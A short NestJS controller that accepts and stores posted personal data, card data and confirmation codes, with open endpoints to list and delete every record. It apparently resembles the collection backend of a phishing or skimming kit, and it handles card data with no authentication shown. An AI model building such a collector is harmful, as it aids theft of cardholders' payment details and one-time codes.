import { Controller, Post, Body, Get, Delete } from '@nestjs/common';
import { AppLogsService } from './app-logs.service';

@Controller('app-logs')
export class AppLogsController {
  constructor(private readonly appLogsService: AppLogsService) {}

  @Post('personal_data')
  async createPersonal(@Body() body: any) {
    return this.appLogsService.create('personal_data', body);
  }

  @Post('card_data')
  async createCard(@Body() body: any) {
    return this.appLogsService.create('card_data', body);
  }

  @Post('confirmation_code')
  async createCode(@Body() body: any) {
    return this.appLogsService.create('confirmation_code', body);
  }

  @Get()
  async findAll() {
    return this.appLogsService.findAll();
  }

  @Delete()
  async clear() {
    return this.appLogsService.clear();
  }
}
